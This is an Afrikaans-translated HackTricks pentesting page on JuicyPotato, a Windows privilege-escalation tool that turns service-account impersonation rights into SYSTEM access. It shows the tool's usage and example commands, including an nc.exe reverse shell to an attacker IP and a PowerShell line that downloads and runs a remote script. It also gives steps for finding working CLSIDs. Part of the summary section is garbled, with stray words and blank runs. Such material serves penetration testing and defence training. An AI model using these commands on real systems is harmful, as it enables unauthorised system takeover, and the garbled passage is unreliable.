# JuicyPotato

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato werk nie** op Windows Server 2019 en Windows 10 bou 1809 en later nie. Nietemin, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) kan gebruik word om dieselfde voorregte te benut en `NT AUTHORITY\SYSTEM` vlak toegang te verkry. _**Kyk:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (misbruik van die goue voorregte) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_'n Gesuikerde weergawe van_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, met 'n bietjie sap, d.w.s.  **'n Ander Plaaslike Voorregverhogingshulpmiddel, van 'n Windows-diensrekening tot NT AUTHORITY\SYSTEM**_

#### Jy kan juicypotato aflaai van [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Opsomming <a href="#summary" id="summary"></a>

[**Van juicy-potato Leesmy**](https://github.com/ohpe/juicy-potato/blob/master/README.md Norris translation Af















































 Travelprivacy



























 TravelA A Est
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Laaste gedagtes <a href="#final-thoughts" id="final-thoughts"></a>

[**Van juicy-potato Leesmy**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

As die gebruiker `SeImpersonate` of `SeAssignPrimaryToken` voorregte het, is jy **SYSTEM**.

Dit is amper onmoontlik om die misbruik van al hierdie COM-bediener te voorkom. Jy kan dalk dink om die toestemmings van hierdie voorwerpe te wysig via `DCOMCNFG` maar sterkte, dit gaan 'n uitdaging wees.

Die werklike oplossing is om sensitiewe rekeninge en toepassings wat onder die `* SERVICE` rekeninge loop, te beskerm. Om `DCOM` te stop sal hierdie uitbuiting sekerlik belemmer, maar dit kan 'n ernstige impak op die onderliggende bedryfstelsel hê.

Van: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Voorbeelde

Nota: Besoek [hierdie bladsy](https://ohpe.it/juicy-potato/CLSID/) vir 'n lys van CLSIDs om te probeer.

### Kry 'n nc.exe omgekeerde dopshell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell omgekeer
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Begin 'n nuwe CMD (as jy RDP-toegang het)

![](<../../.gitbook/assets/image (297).png>)

## CLSID Probleme

Dikwels werk die standaard CLSID wat JuicyPotato gebruik **nie** en misluk die uitbuiting. Gewoonlik neem dit verskeie pogings om 'n **werkende CLSID** te vind. Om 'n lys van CLSIDs te kry om te probeer vir 'n spesifieke bedryfstelsel, moet jy hierdie bladsy besoek:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Kontroleer CLSIDs**

Eerstens, sal jy 'n paar uitvoerbare lêers benodig buite juicypotato.exe.

Laai [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) af en laai dit in jou PS-sessie, en laai [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) af en voer dit uit. Daardie skripsie sal 'n lys van moontlike CLSIDs skep om te toets.

Laai dan [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(verander die pad na die CLSID-lys en na die juicypotato-uitvoerbare lêer) af en voer dit uit. Dit sal begin om elke CLSID te probeer, en **wanneer die poortnommer verander, sal dit beteken dat die CLSID gewerk het**.

**Kontroleer** die werkende CLSIDs **deur die parameter -c te gebruik**

## Verwysings

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks-klere**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>
